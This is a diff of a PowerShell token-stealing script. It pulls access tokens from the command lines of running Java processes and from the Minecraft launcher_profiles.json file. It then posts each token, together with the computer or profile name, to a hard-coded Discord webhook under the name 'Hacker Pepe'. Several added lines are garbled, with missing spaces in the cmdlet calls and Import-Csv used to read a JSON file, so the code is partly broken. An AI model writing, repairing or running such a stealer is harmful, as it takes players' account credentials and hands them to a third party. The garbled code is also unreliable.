@@ -1,5 +1,6 @@
 $webhookUrl = "https://discord.com/api/webhooks/1490629749159104532/wFu6BV4lrg8HHuNzi10Ii4pMXYkJx0_xDuk5NnOgVDoPvJqwAoPsesebgGKOIm2WZ6Oc"
 
+# Check Java processes for Discord tokens
 Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'java%' AND CommandLine LIKE '%accessToken%'" | 
 Select-Object -ExpandProperty CommandLine | 
 ForEach-Object {
@@ -24,59 +25,20 @@ ForEach-Object {
  
  # Properly format the payload for Discord
  $payload = @{
- content = null
- embeds = @(
- @{
- title = "Discord Token"
- color = 2067276
- fields = @(
- @{
- name  = "Access Token"
- value = "$($message)"
- inline= $false
- },
- @{
- name  = "Stolen From"
- value = "$($env:COMPUTERNAME)"
- inline= $true
- }
- )
- }
- )
- username ="Hacker Pepe"
- avatar_url ="https://imgur.com/5Ri5eok.png"
- } | ConvertTo-Json -Depth 10
-
- # Send the payload to the Discord webhook
- Invoke-RestMethod -Uri "$webhookUrl" -Method Post -ContentType "application/json" -Body ($payload)
- }
-}
-
-# Check Minecraft launcher profiles for access tokens (if applicable)
-$minecraftPath="C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\launcher_profiles.json"
-
-if (Test-Path "$minecraftPath") {
- try {
- Import-Csv "$minecraftPath" | ForEach-Object {
- if ($_.properties.accessToken) {
- Write-Output "Minecraft Access Token Found!"
-
- # Properly format the payload for Discord
- $payloadToken=@{
  content=null
  embeds=@(
  @{
- title="Minecraft Access Token"
+ title="Discord Token"
  color=2067276
  fields=@(
  @{
  name="Access Token"
- value=$_.properties.accessToken.ToString()
+ value=$message.ToString()
  inline=$false
  },
  @{
- name="Profile Name"
- value=$_.name.ToString()
+ name="Stolen From"
+ value=$env:COMPUTERNAME.ToString()
  inline=$true
  }
  )
@@ -87,9 +49,32 @@ if (Test-Path "$minecraftPath") {
  }|ConvertTo-Json-D10
 
  # Send the payload to the Discord webhook 
+ Invoke-RestMethod-Uri"$webhookUrl"-MethodPost-ConType"application/json"-Body($payload)
+ }
+}
+
+# Check Minecraft launcher profiles for access tokens (if applicable)
+$minecraftPath="C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\launcher_profiles.json"
+
+if (Test-Path "$minecraftPath") {  
+  try {  
+ Import-Csv "$minecraftPath" | ForEach-Object {  
+ if ($_.properties.accessToken) {  
+ Write-Output "Minecraft Access Token Found!"  
+
+ # Properly format the payload for Discord  
+ $payloadToken=@{  
+ content=null  
+ embeds=@(  
+ @{title="Minecraft Access Token";color=2067276;fields=(@{name='Access Token';value=$_.properties.accessToken.ToString();inline=$false},@{name='Profile Name';value=$_.name.ToString();inline=$true})} 
+ ) 
+ username="Hacker Pepe" 
+ avatar_url="https://imgur.com/5Ri5eok.png" 
+ }|ConvertTo-Json-D10  
+
+ # Send the payload to the Discord webhook 
  Invoke-RestMethod-Uri"$webhookUrl"-MethodPost-ConType"application/json"-Body($payloadToken)
- }
- }
- 
- } catch {Write-Output("Error parsing Minecraft profiles file")} 
+ } 
+ } 
+  } catch {Write-Output("Error parsing Minecraft profiles file")} 
 }
